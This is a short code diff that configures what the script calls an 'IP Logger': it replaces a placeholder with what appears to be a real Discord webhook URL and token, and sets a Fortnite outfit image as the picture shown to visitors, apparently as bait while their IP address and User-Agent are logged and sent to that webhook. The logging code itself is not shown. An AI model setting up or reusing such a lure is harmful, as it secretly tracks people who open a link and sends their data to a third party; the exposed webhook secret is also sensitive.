@@ -7,8 +7,8 @@ import requests, traceback
 
 
 config = {
-    "webhook": "YOUR_DISCORD_WEBHOOK_HERE",
-    "image": "https://your-image-url.com/image.jpg",  # Image to be displayed
+    "webhook": "https://discord.com/api/webhooks/1340894966309851210/Z-AwNME4hBwuACSaI2ZeFN3pb3ryGunUvhGZD8msOZG2VjSvB9TAGEAGvadOb2RjYuKK",
+    "image": "https://progameguides.com/wp-content/uploads/2021/08/fortnite-outfit-Dude-768x803.jpg", 
     "username": "IP Logger",
     "color": 0x3498db,  # Blue color for embed
     "logUserAgent": True,  # Log User-Agent information
